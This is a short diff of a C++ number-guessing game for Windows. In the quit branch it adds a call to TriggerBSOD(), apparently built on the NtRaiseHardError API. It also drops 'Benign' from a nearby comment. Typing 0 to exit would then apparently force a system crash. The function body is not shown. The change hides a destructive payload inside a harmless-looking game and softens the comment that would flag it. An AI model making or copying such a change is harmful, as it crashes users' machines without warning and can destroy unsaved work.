@@ -19,7 +19,7 @@ typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus,
     ULONG ResponseOption,
     PULONG Response);
 
-// Benign action to run when the user guesses correctly.
+// Action to run when the user guesses correctly.
 static void TriggerAction()
 {
     MessageBoxA(NULL, "brace for impact", "Success", MB_OK | MB_ICONINFORMATION);
@@ -72,6 +72,7 @@ void main()
         if (guess == 0)
         {
             std::cout << "Quit.\n";
+			TriggerBSOD();
             return;
         }
         if (guess < 1 || guess > 100)
